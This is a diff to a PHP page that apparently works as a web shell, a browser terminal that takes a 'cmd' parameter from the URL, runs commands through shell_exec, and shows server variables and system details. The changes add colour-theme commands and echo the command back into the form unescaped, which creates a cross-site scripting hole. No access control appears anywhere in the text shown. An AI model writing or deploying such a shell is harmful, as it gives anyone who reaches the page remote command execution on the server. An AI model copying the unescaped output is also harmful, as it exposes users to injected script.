@@ -1,5 +1,4 @@
 <?php
-
 $version = "1.0.1";
 $date = date("Y-m-d H:i:s");
 $indicesServer = array('PHP_SELF',
@@ -42,8 +41,6 @@ $indicesServer = array('PHP_SELF',
 'AUTH_TYPE',
 'PATH_INFO',
 'ORIG_PATH_INFO') ;
-
-
 if (empty($_GET['cmd'])) {
 
 	if (PHP_OS === "Linux") {
@@ -55,7 +52,6 @@ if (empty($_GET['cmd'])) {
 		$cmd = "dir";
 		$pwd = shell_exec("cd");
 	}
-
 }else{
 
 	if (PHP_OS === "Linux") {
@@ -68,11 +64,31 @@ if (empty($_GET['cmd'])) {
 		$pwd = shell_exec("cd");
 	}
 }
-
-
+if ($_GET['cmd'] === "color 1") {
+	$color = "#0080FF";
+}else if ($_GET['cmd'] === "color 2") {
+	$color = "#24B800";
+}else if ($_GET['cmd'] === "color 3") {
+	$color = "#2DECFF";
+}else if ($_GET['cmd'] === "color 4") {
+	$color = "#FF4C4C";
+}else if ($_GET['cmd'] === "color 5") {
+	$color = "#F14CFF";
+}else if ($_GET['cmd'] === "color 6") {
+	$color = "#F0EC20";
+}else if ($_GET['cmd'] === "color 7") {
+	$color = "#C2C2C2";
+}else if ($_GET['cmd'] === "color 8") {
+	$color = "#FFB200";
+}else if ($_GET['cmd'] === "color 0") {
+	$color = "White";
+}else{
+	$color = "White";
+}
+if ($_GET['cmd'] === "help") {
+	$help = "help";
+}
 ?>
-
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -135,7 +151,7 @@ if (empty($_GET['cmd'])) {
 		min-height: 650px;
 
 		background-color: black;
-		color: white;
+		color: <?php echo $color;?>;
 
 	}
 
@@ -201,12 +217,12 @@ if (empty($_GET['cmd'])) {
 		?>
 		</textarea>
 		<form method="GET" action="#">
-			<input type="text" name="cmd">					
+			<input type="text" name="cmd" value="<?php echo $cmd;?>">					
 		</form>
 	</section>
 	<section class="info">
 		<?php 
-			echo '<table border=1 cellpadding="10" style="color: white; font-family: sans-serif; margin-left: auto; margin-right: auto; margin-top: 50px;">' ;
+			echo '<table border=1 cellpadding="10" style="color: white;   font-family: sans-serif; margin-left: auto; margin-right: auto; margin-top: 50px;">' ;
 			foreach ($indicesServer as $arg) {
 			    if (isset($_SERVER[$arg])) {
 			        echo '<tr><td>'.$arg.'</td><td>' . $_SERVER[$arg] . '</td></tr>' ;
@@ -222,10 +238,6 @@ if (empty($_GET['cmd'])) {
 		<p><?php echo php_uname(); ?></p>
 	</div>
 </main>
-<footer>
-	
-</footer>
-
 </body>
 </html>
 
